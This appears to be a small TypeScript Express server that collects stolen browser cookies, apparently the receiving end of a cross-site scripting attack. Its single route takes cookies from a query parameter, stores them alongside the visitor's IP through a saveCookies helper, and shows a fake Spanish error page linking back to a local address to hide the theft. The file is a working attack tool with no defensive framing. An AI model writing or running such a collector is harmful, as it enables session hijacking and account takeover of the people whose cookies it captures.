import express, { Request, Response } from 'express'
import cors from 'cors'

import { saveCookies } from './save-cookies'

const app = express()
const port = 3000
const host = '0.0.0.0'

app.use(cors())
app.use(express.json())

app.get('/', (req: Request, res: Response) => {
  const ip = req.ip ?? '127.0.0.1'
  const cookies = req.query.cookies as string

  saveCookies(ip, cookies)

  res.send(`
    <a href='http://192.168.100.14/'>
      <h1>
        Error, regresar a la página principal
      </h1>
    </a>
  `)
})

app.listen(port, () => {
  console.log(`Servidor Express corriendo en http://${host}:${port}`)
})
